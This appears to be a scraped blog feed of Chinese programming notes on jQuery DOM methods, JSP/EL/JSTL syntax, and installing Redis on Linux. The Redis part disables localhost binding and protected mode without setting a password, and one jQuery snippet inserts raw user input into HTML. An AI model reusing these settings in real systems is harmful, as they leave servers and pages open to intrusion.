<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取单个属性的值</span></span><br><span class="line"><span class="keyword">var</span> obj=$(<span class="string">&quot;div&quot;</span>).css(<span class="string">&quot;color&quot;</span>);</span><br><span class="line">alert(obj);</span><br><span class="line"><span class="comment">//获取多个属性的值</span></span><br><span class="line"><span class="keyword">var</span> obj=$(<span class="string">&quot;div&quot;</span>).css([<span class="string">&quot;color&quot;</span>,<span class="string">&quot;font-size&quot;</span>,<span class="string">&quot;font-family&quot;</span>]);</span><br><span class="line"><span class="comment">//在控制台查看obj</span></span><br><span class="line"><span class="built_in">console</span>.log(obj)</span><br></pre></td></tr></table></figure>

<h4 id="（3）添加样式"><a href="#（3）添加样式" class="headerlink" title="（3）添加样式"></a>（3）添加样式</h4><p><strong>addClass、removeClass、toggleClass</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#btn1&#x27;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;div&#x27;</span>).addClass(<span class="string">&quot;style1&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;#btn3&#x27;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;div&#x27;</span>).removeClass(<span class="string">&quot;style2&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//切换样式</span></span><br><span class="line">$(<span class="string">&#x27;#btn5&#x27;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;div&#x27;</span>).toggleClass(<span class="string">&quot;style3&quot;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="2、html"><a href="#2、html" class="headerlink" title="2、html"></a>2、html</h3><p><strong>.html()和.text()方法不能使用在表单元素上,而.val()只能使用在表单元素上；</strong></p>
<p><strong>.val()方法和.html()相同，如果其应用在元素集合上时，只能读取第一个表单元素的”value”值</strong></p>
<p><strong>但是.text()不一样，如果.text()应用在多个元素上时，将会读取所有选中元素的文本内容；</strong></p>
<p><strong>进行字符串拼接 ps: 利用标签属性（p/span/div/tr/td/li）</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建行  拼接字符串,添加到tbody中</span></span><br><span class="line"><span class="keyword">var</span> newcows=<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>+lesson+<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>+accedemic</span><br><span class="line">			+<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&lt;a href=&#x27;javascrip:;&#x27; class=&#x27;del&#x27;&gt;删除&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> content=<span class="string">&quot;&lt;p&gt;&lt;span&gt;用户&quot;</span>+count+<span class="string">&quot;:&lt;/span&gt;&quot;</span>+$(<span class="string">&quot;#text&quot;</span>).val()+<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="（1）html方法"><a href="#（1）html方法" class="headerlink" title="（1）html方法"></a>（1）html方法</h4><p>获得html代码，含有标签</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//读取innerHtml，只适用与DOM对象</span></span><br><span class="line">	<span class="keyword">var</span> content=$(<span class="string">&quot;#d1&quot;</span>).html();</span><br><span class="line">	alert(content);</span><br><span class="line">&#125;)</span><br><span class="line">$(<span class="string">&quot;#btn2&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&quot;#d1&quot;</span>).html(<span class="string">&quot;ssss&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="（2）text方法"><a href="#（2）text方法" class="headerlink" title="（2）text方法"></a>（2）text方法</h4><p>获得文本值，将标签进行过滤</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;	 </span><br><span class="line">	<span class="keyword">var</span> content=$(<span class="string">&quot;.left&quot;</span>).text(); <span class="comment">//读，相当与DOM的innerText</span></span><br><span class="line">	alert(content);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;#btn2&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="comment">//写</span></span><br><span class="line">	$(<span class="string">&quot;.left&quot;</span>).text(<span class="string">&quot;ssss&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="（3）val方法"><a href="#（3）val方法" class="headerlink" title="（3）val方法"></a>（3）val方法</h4><p>获得value的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;.btn1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//不带参的方法，读value</span></span><br><span class="line">	alert($(<span class="string">&quot;.txt&quot;</span>).val());</span><br><span class="line">	<span class="comment">// alert($(&quot;.txt&quot;)[0].value);</span></span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">&quot;.btn2&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="comment">//带参的方法，写</span></span><br><span class="line">	$(<span class="string">&quot;.txt&quot;</span>).val(<span class="string">&quot;&quot;</span>);<span class="comment">//清空</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="六、元素宽高"><a href="#六、元素宽高" class="headerlink" title="六、元素宽高"></a>六、元素宽高</h2><h4 id="（1）元素的宽和高"><a href="#（1）元素的宽和高" class="headerlink" title="（1）元素的宽和高"></a>（1）元素的宽和高</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">&quot;宽：&quot;</span>+$(<span class="string">&#x27;div&#x27;</span>).width()+<span class="string">&quot;高：&quot;</span>+$(<span class="string">&#x27;div&#x27;</span>).height());</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;div&#x27;</span>).width($(<span class="string">&#x27;div&#x27;</span>).width()+<span class="number">50</span>);</span><br><span class="line">$(<span class="string">&#x27;div&#x27;</span>).height($(<span class="string">&#x27;div&#x27;</span>).width()+<span class="number">50</span>);</span><br></pre></td></tr></table></figure>

<h4 id="（2）元素的位置"><a href="#（2）元素的位置" class="headerlink" title="（2）元素的位置"></a>（2）元素的位置</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">&quot;left:&quot;</span>+$(<span class="string">&#x27;div&#x27;</span>).offset().left+<span class="string">&quot;top:&quot;</span>+$(<span class="string">&#x27;div&#x27;</span>).offset().top);</span><br><span class="line">$(<span class="string">&#x27;div&#x27;</span>).offset(&#123;<span class="attr">left</span>:<span class="number">300</span>,<span class="attr">top</span>:<span class="number">300</span>&#125;); </span><br></pre></td></tr></table></figure>

<h4 id="（3）元素内部宽高"><a href="#（3）元素内部宽高" class="headerlink" title="（3）元素内部宽高"></a>（3）元素内部宽高</h4><p><strong>包括内边缘</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).width());</span><br><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).height());</span><br><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).innerHeight());<span class="comment">// 100+10+10</span></span><br><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).innerWidth());</span><br></pre></td></tr></table></figure>

<h4 id="（4）元素外部宽高"><a href="#（4）元素外部宽高" class="headerlink" title="（4）元素外部宽高"></a>（4）元素外部宽高</h4><p><strong>outerWidth() 包括边框</strong></p>
<p><strong>outerWidth(true) 包括边框和外边缘</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).outerHeight()); <span class="comment">//100+10+10+5+5</span></span><br><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).outerWidth());</span><br><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).outerHeight(<span class="literal">true</span>)); <span class="comment">//100+10+10+5+5+20+20</span></span><br><span class="line">alert($(<span class="string">&#x27;div&#x27;</span>).outerWidth(<span class="literal">true</span>)); </span><br></pre></td></tr></table></figure>

<h4 id="（5）节点操作"><a href="#（5）节点操作" class="headerlink" title="（5）节点操作"></a>（5）节点操作</h4><h5 id="a、内部插入"><a href="#a、内部插入" class="headerlink" title="a、内部插入"></a>a、内部插入</h5><p><strong>append、appendTo</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> $newNode1=$(<span class="string">&quot;&lt;li&gt;爱神&lt;/li&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;ul&quot;</span>).append($newNode1);</span><br><span class="line">$newNode1.appendTo(<span class="string">&quot;ul&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>前置插入prepend</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;ul&quot;</span>).prepend($newNode1);</span><br></pre></td></tr></table></figure>

<h5 id="b、外部插入"><a href="#b、外部插入" class="headerlink" title="b、外部插入"></a>b、外部插入</h5><p><strong>元素之前插入同辈节点</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;ul&quot;</span>).after($newNode1);</span><br><span class="line">$newNode1.insertAfter(<span class="string">&quot;ul&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>元素之后同辈节点</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;ul&quot;</span>).before($newNode1);</span><br><span class="line">$newNode1.insertBefore(<span class="string">&quot;ul&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="c、删除清空"><a href="#c、删除清空" class="headerlink" title="c、删除清空"></a>c、删除清空</h5><p><strong>删除、清空节点</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;ul li:eq(1)&quot;</span>).remove();</span><br><span class="line">$(<span class="string">&quot;ul li:eq(1)&quot;</span>).detach(); <span class="comment">//拆卸</span></span><br><span class="line">$(<span class="string">&quot;ul li:eq(1)&quot;</span>).empty();     </span><br></pre></td></tr></table></figure>

<h5 id="d、替换"><a href="#d、替换" class="headerlink" title="d、替换"></a>d、替换</h5><p><strong>替换节点</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;ul li:eq(1)&quot;</span>).replaceWith($newNode1);</span><br></pre></td></tr></table></figure>

<h5 id="e、复制"><a href="#e、复制" class="headerlink" title="e、复制"></a>e、复制</h5><p><strong>复制节点</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;ul li:eq(1)&quot;</span>).clone().appendTo(<span class="string">&quot;ul&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出元素本身html</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert($(<span class="string">&quot;&lt;div&gt;&lt;/div&gt;&quot;</span>).append($(<span class="string">&quot;ul li:eq(1)&quot;</span>).clone()).html());</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> btn=$(<span class="built_in">this</span>).clone(<span class="literal">true</span>); <span class="comment">//true指复印获得原件的事件</span></span><br><span class="line">$(<span class="string">&quot;body&quot;</span>).append(btn);</span><br></pre></td></tr></table></figure>

<h4 id="（6）素材遍历"><a href="#（6）素材遍历" class="headerlink" title="（6）素材遍历"></a>（6）素材遍历</h4><p><strong>each(function(i,e){</strong></p>
<p><strong>})</strong></p>
<p><strong>i 为元素下标，e为元素本身</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#btn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&quot;li&quot;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">i,e</span>)</span>&#123;</span><br><span class="line">		<span class="comment">// alert(i);</span></span><br><span class="line">		alert($(e).text())</span><br><span class="line">		<span class="comment">// alert($(this).text());</span></span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="（7）is"><a href="#（7）is" class="headerlink" title="（7）is"></a>（7）is</h4><p><strong>得到按钮状态</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> check=$(<span class="built_in">this</span>).is(<span class="string">&quot;:checked&quot;</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>jsp</title>
    <url>/2020/11/11/04jsp/</url>
    <content><![CDATA[<h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><p><strong>html静态内容</strong></p>
<p>java Server Pages <strong>开发动态Web资源</strong></p>
<h3 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h3><p>Java JDK、Tomcat服务器、配置环境变量</p>
<h3 id="一、生命周期"><a href="#一、生命周期" class="headerlink" title="一、生命周期"></a>一、生命周期</h3><p><strong>解析JSP文件，将JSP文件转为servlet，编译servlet</strong></p>
<ul>
<li>初始化阶段</li>
<li>执行阶段</li>
<li>销毁阶段</li>
</ul>
<h3 id="二、jsp和Servlet"><a href="#二、jsp和Servlet" class="headerlink" title="二、jsp和Servlet"></a>二、jsp和Servlet</h3><p>Servlet:负责 <strong>获取表单数据、处理业务逻辑、分发转向</strong></p>
<p>Jsp:代码显示模块。重点在于<strong>显示数据</strong></p>
<img src="https://csn.damyoung.cn/image-20200916162638158.png" alt="image-20200916162638158" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20200917102959090.png" alt="image-20200917102959090" style="zoom: 80%;" />

<h3 id="三、jsp基本语法"><a href="#三、jsp基本语法" class="headerlink" title="三、jsp基本语法"></a>三、jsp基本语法</h3><h4 id="1、jsp脚本"><a href="#1、jsp脚本" class="headerlink" title="1、jsp脚本"></a>1、jsp脚本</h4><p>**&lt;%    java代码    %&gt;、&lt;%    =2+3(表达式)**    %&gt; == out.print(2+3)</p>
<h4 id="2、三大指令"><a href="#2、三大指令" class="headerlink" title="2、三大指令"></a>2、三大指令</h4><p><strong>&lt;%@ page/include/taglib =””%&gt;</strong></p>
<h5 id="（1）page"><a href="#（1）page" class="headerlink" title="（1）page"></a>（1）page</h5><p>用于定义jsp页面的各种属性</p>
<img src="https://csn.damyoung.cn/image-20200916163841073.png" alt="image-20200916163841073" style="zoom: 80%;" />

<h5 id="（2）include"><a href="#（2）include" class="headerlink" title="（2）include"></a>（2）include</h5><p>把其他资源包含到当前页面中</p>
<img src="https://csn.damyoung.cn/image-20200916163911731.png" alt="image-20200916163911731" style="zoom: 80%;" />

<p>静态包含：&lt;%@ include file=”**/**include/header.jsp” %&gt;</p>
<p>动态包含：&lt;jsp:include page=”/include/header.jsp”&gt;&lt; /jsp:include&gt;</p>
<p><strong>区别：</strong></p>
<p>前者：在解析时就把两个文件合并</p>
<p>后者：不会合并文件，当代码执行到include时，才包含另一个文件的内容。</p>
<h5 id="（3）taglib"><a href="#（3）taglib" class="headerlink" title="（3）taglib"></a>（3）taglib</h5><p>在JSP页面中导入JSTL标签库。替换jsp中的java代码片段。</p>
<h4 id="3、六大动作"><a href="#3、六大动作" class="headerlink" title="3、六大动作"></a>3、六大动作</h4><p>动态包含&lt; jsp:include&gt;</p>
<p>请求转发 &lt; jsp:forward &gt;</p>
<p>设置请求参数 &lt; jsp:param&gt;</p>
<p>创建对象  &lt; jsp:useBean&gt;</p>
<p>对象属性赋值&lt; jsp:setProperty&gt;</p>
<p>取出对象属性值&lt; jsp:getProperty&gt;</p>
<h4 id="4、内置对象"><a href="#4、内置对象" class="headerlink" title="4、内置对象"></a>4、内置对象</h4><p>request、reponse、session、application、</p>
<p>exception、page、config、out</p>
<p>pageContext</p>
<h4 id="5、pageContext域"><a href="#5、pageContext域" class="headerlink" title="5、pageContext域"></a>5、pageContext域</h4><p><strong>域对象，生命周期为当前jsp页面</strong></p>
<p>findAttribute(String name);   自动从page request session application依次查找，找到了就取值，结束查找。</p>
<p><strong>可以操作其他三个域对象</strong></p>
<p><img src="https://csn.damyoung.cn/image-20200916165030469.png" alt="image-20200916165030469"></p>
<h3 id="四、EL表达式"><a href="#四、EL表达式" class="headerlink" title="四、EL表达式"></a>四、EL表达式</h3><p>expression language</p>
<p><strong>jsp获取数据的规范</strong></p>
<blockquote>
<p>当el表达式首字母大写，会判断第二个字母大小写，小写，抛异常；大写，则直接拼接get，形成getter方法</p>
<p>当el表达式首字母小写，会判断第二个字母大小写，大写，必须第一个字母大写；否则无法获取值</p>
<p>el首字母大写，至少第二个字母必须大写。</p>
</blockquote>
<h4 id="1、直接获取"><a href="#1、直接获取" class="headerlink" title="1、直接获取"></a>1、直接获取</h4><img src="https://csn.damyoung.cn/image-20200917111912413.png" alt="image-20200917111912413" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20200917115049001.png" alt="image-20200917115049001" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20200917111942792.png" alt="image-20200917111942792" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20200917111953729.png" alt="image-20200917111953729" style="zoom:80%;" />

<h4 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h4><p><strong>未指定则按从上往下找</strong></p>
<p><img src="https://csn.damyoung.cn/image-20200917113240622.png" alt="image-20200917113240622"></p>
<table>
<thead>
<tr>
<th>EL隐式对象引用名称</th>
<th>类型</th>
<th>JSP内置对象名称</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td>pageContext</td>
<td>javax.servlet.jsp.PageContext</td>
<td>pageContext</td>
<td align="center">一样的</td>
</tr>
<tr>
<td>pageScope</td>
<td>java.util.Map&lt;String,Object&gt;</td>
<td>没有对应的</td>
<td align="center">pageContext范围中存放的数据,页面范围</td>
</tr>
<tr>
<td>requestScope</td>
<td>java.util.Map&lt;String,Object&gt;</td>
<td>没有对应的</td>
<td align="center">请求范围数据</td>
</tr>
<tr>
<td>sessionScope</td>
<td>java.util.Map&lt;String,Object&gt;</td>
<td>没有对应的</td>
<td align="center">会话范围数据</td>
</tr>
<tr>
<td>applicationScope</td>
<td>java.util.Map&lt;String,Object&gt;</td>
<td>没有对应的</td>
<td align="center">应用范围数据</td>
</tr>
<tr>
<td>param</td>
<td>java.util.Map&lt;String,String&gt;</td>
<td>没有对应的</td>
<td align="center">一个请求参数</td>
</tr>
<tr>
<td>paramValues</td>
<td>java.util.Map&lt;String,String[]&gt;</td>
<td>没有对应的</td>
<td align="center">重名请求参数</td>
</tr>
<tr>
<td>header</td>
<td>java.util.Map&lt;String,String&gt;</td>
<td>没有对应的</td>
<td align="center">一个请求消息头</td>
</tr>
<tr>
<td>headerValues</td>
<td>java.util.Map&lt;String,String[]&gt;</td>
<td>没有对应的</td>
<td align="center">重名请求消息头</td>
</tr>
<tr>
<td>initParam</td>
<td>java.util.Map&lt;String,String&gt;</td>
<td>没有对应的</td>
<td align="center">web.xml中全局参数</td>
</tr>
<tr>
<td>cookie</td>
<td>java.util.Map&lt;String,Cookie&gt;</td>
<td>没有对应的</td>
<td align="center">key:cookie对象的name值</td>
</tr>
</tbody></table>
<h4 id="3、param请求参数"><a href="#3、param请求参数" class="headerlink" title="3、param请求参数"></a>3、param请求参数</h4><p><strong>获取表单元素</strong></p>
<img src="https://csn.damyoung.cn/image-20200917113941184.png" alt="image-20200917113941184" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20200917113918244.png" alt="image-20200917113918244" style="zoom: 80%;" />

<h4 id="4、运算"><a href="#4、运算" class="headerlink" title="4、运算"></a>4、运算</h4><h5 id="empty"><a href="#empty" class="headerlink" title="empty"></a>empty</h5><p>判断null</p>
<img src="https://csn.damyoung.cn/image-20200917141810079.png" alt="image-20200917141810079" style="zoom:80%;" />

<h5 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h5><img src="https://csn.damyoung.cn/image-20200917141828111.png" alt="image-20200917141828111" style="zoom:80%;" />

<h3 id="五、JSTL"><a href="#五、JSTL" class="headerlink" title="五、JSTL"></a>五、JSTL</h3><p>导入jstl-1.2.jar包</p>
<p>javaServletPages Standard Tag Library <strong>JSP标准标签库</strong></p>
<p>作用：<strong>实现JSP页面中逻辑处理</strong>，如循环判断</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>（1）添加taglib指令 </p>
<blockquote>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>（2）使用JSTL标签</p>
<h4 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">设置变量:&lt;c:set var=&quot;num&quot; value=&quot;$&#123;10+5&#125;&quot; scope=&quot;request&quot; &gt;&lt;/c:set&gt;&lt;br&gt;</span><br><span class="line">输出数据:&lt;c:out value=&quot;$&#123;num&#125;&quot;&gt;&lt;/c:out&gt;&lt;br&gt;</span><br><span class="line">移除变量:&lt;c:remove var=&quot;$&#123;num&#125;&quot;&gt;&lt;/c:remove&gt;&lt;br&gt;</span><br><span class="line">移除后输出:&lt;c:out value=&quot;$&#123;num&#125;&quot; default=&quot;aaa&quot;&gt;&lt;/c:out&gt;</span><br></pre></td></tr></table></figure>

<h5 id="条件标签"><a href="#条件标签" class="headerlink" title="条件标签"></a>条件标签</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;c:set var=&quot;num&quot; value=&quot;3&quot;&gt;&lt;/c:set&gt;</span><br><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">&quot;$&#123;num&lt;5&#125;&quot;</span>&gt;</span><br><span class="line">    结果为<span class="keyword">true</span></span><br><span class="line">&lt;/c:if&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:choose&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;num==1&#125;&quot;</span>&gt;</span><br><span class="line">        第一名</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;num==2&#125;&quot;</span>&gt;</span><br><span class="line">        第二名<span class="number">0</span></span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;num==3&#125;&quot;</span>&gt;</span><br><span class="line">        第三名</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">     &lt;c:otherwise&gt;</span><br><span class="line">        不及格</span><br><span class="line">    &lt;/c:otherwise&gt;</span><br><span class="line">&lt;/c:choose&gt;</span><br></pre></td></tr></table></figure>

<h5 id="迭代标签"><a href="#迭代标签" class="headerlink" title="迭代标签"></a>迭代标签</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;i&quot;</span> begin=<span class="string">&quot;2&quot;</span> end=<span class="string">&quot;10&quot;</span> step=<span class="string">&quot;2&quot;</span>&gt;</span><br><span class="line">    &lt;hr&gt;$&#123;i&#125;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>items表示遍历的集合</p>
<p>varStatus表示引用一个对象(count、first、last、index)</p>
<p>var表示变量</p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;c:forEach items=<span class="string">&quot;$&#123;list&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;li&quot;</span> varStatus=<span class="string">&quot;vs&quot;</span>&gt;</span><br><span class="line">   &lt;tr $&#123;vs.count%<span class="number">2</span>==<span class="number">1</span>? <span class="string">&quot;style=&#x27;background-color:yellow&#x27;&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&gt;</span><br><span class="line">       &lt;td&gt;$&#123;li.key&#125;&lt;/td&gt;</span><br><span class="line">       &lt;td&gt;$&#123;li.value&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;$&#123;li&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;$&#123;vs.index&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;$&#123;vs.count&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;$&#123;vs.first&#125;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;$&#123;vs.last&#125;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;&lt;hr&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装redis</title>
    <url>/2020/10/11/04Redis%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h4 id="Linux安装redis"><a href="#Linux安装redis" class="headerlink" title="Linux安装redis"></a>Linux安装redis</h4><blockquote>
<p>下载redis安装包</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.8.tar.gz</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解压</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf redis-4.0.8.tar.gz</span><br></pre></td></tr></table></figure>

<blockquote>
<p>安装</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd redis-4.0.8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>还需要安装gcc编译     </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y gcc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>出现fatal error</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make MALLOC&#x3D;libc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>启动服务</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd src </span><br><span class="line">.&#x2F;redis-server&amp; &#x2F;&#x2F;启动服务</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关闭服务</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-cli shutdown</span><br></pre></td></tr></table></figure>

<blockquote>
<p>启动客户端</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-cli</span><br></pre></td></tr></table></figure>



<p><strong>启动多台redis服务</strong></p>
<p>1、改端口号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-server --port 6380</span><br><span class="line"></span><br><span class="line"> .&#x2F;redis-cli -p 6380</span><br></pre></td></tr></table></figure>



<p>2、配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat redis.conf |grep -v &quot;#&quot; |grep -v &quot;^$&quot;&gt;redis-6379.conf</span><br><span class="line">vim redis-6379.conf</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20201101103021970.png" alt="image-20201101103021970"></p>
<p><strong>ps -ef</strong> #用标准的格式显示进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;查看是否存在redis服务</span><br><span class="line">ps -ef| grep redis-</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;配置文件启动服务端</span><br><span class="line">.&#x2F;redis-cli </span><br></pre></td></tr></table></figure>



<p>修改redis.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_0_10_centos redis-5.0.5]# vim &#x2F;usr&#x2F;local&#x2F;redis&#x2F;redis.conf</span><br><span class="line"># 注释掉bind 127.0.0.1</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"></span><br><span class="line"># 取消ip绑定 更改 yes 为 no</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 开启守护进程 更改 no 为 yes</span><br><span class="line">daemonize yes</span><br></pre></td></tr></table></figure>

<p>检查redis服务是否启动</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ps -ef|grep redis</span><br></pre></td></tr></table></figure>

<p>启动，并指定配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;redis</span><br><span class="line"> .&#x2F;bin&#x2F;redis-server .&#x2F;redis.conf(第一个)</span><br></pre></td></tr></table></figure>

<p>本地客户端连接</p>
